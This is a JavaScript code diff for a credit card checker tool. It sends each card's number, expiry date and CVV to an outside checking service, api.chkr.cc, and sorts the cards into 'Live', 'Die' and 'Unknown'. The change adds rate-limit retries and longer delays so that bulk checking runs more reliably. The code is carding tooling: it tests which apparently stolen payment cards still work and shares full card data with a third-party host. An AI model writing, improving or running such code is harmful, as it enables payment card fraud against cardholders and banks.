@@ -579,26 +579,49 @@
             const c = allCards[i];
             const pipeStr = `${c.raw_number}|${c.expiry.split('/')[0]}|${c.expiry.split('/')[1]}|${c.cvv}`;
             
-            try {
-                const res = await fetch('https://api.chkr.cc/', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ data: pipeStr })
-                });
-                const j = await res.json();
-                checkedCount++;
-                
-                if (j.code === 1) {
-                    // LIVE!
-                    liveCards.push({ ...c, pipe: pipeStr, gate: j.message || 'OK' });
-                } else if (j.code === 0) {
-                    dieCount++;
-                } else {
-                    unknownCount++;
+            let success = false;
+            let retries = 0;
+            const maxRetries = 3;
+            
+            while (!success && retries < maxRetries) {
+                try {
+                    const res = await fetch('https://api.chkr.cc/', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ data: pipeStr })
+                    });
+                    
+                    if (res.status === 429) {
+                        // Rate limited — wait longer and retry
+                        retries++;
+                        const waitTime = retries * 5000; // 5s, 10s, 15s
+                        document.getElementById('gl-progress').innerHTML = 
+                            `⏳ Rate limited — waiting ${waitTime/1000}s before retry (${retries}/${maxRetries})... | ` +
+                            `Checked: ${checkedCount}/${allCards.length} | ` +
+                            `<span class="text-green-400">Live: ${liveCards.length}</span>`;
+                        await new Promise(r => setTimeout(r, waitTime));
+                        continue;
+                    }
+                    
+                    const j = await res.json();
+                    checkedCount++;
+                    success = true;
+                    
+                    if (j.code === 1) {
+                        liveCards.push({ ...c, pipe: pipeStr, gate: j.message || 'OK' });
+                    } else if (j.code === 0) {
+                        dieCount++;
+                    } else {
+                        unknownCount++;
+                    }
+                } catch(e) {
+                    retries++;
+                    if (retries >= maxRetries) {
+                        checkedCount++;
+                        unknownCount++;
+                    }
+                    await new Promise(r => setTimeout(r, 3000));
                 }
-            } catch(e) {
-                checkedCount++;
-                unknownCount++;
             }
             
             // Update progress
@@ -610,13 +633,10 @@
                 `<span class="text-red-400">Die: ${dieCount}</span> | ` +
                 `<span class="text-yellow-400">Unknown: ${unknownCount}</span>`;
             
-            // Update live cards display in real-time
-            if (liveCards.length > 0) {
-                renderLiveCards();
-            }
+            if (liveCards.length > 0) renderLiveCards();
             
-            // Small delay to avoid overwhelming
-            await new Promise(r => setTimeout(r, 1200));
+            // 2s delay between checks to avoid rate limit
+            await new Promise(r => setTimeout(r, 2000));
         }
         
         // Done!
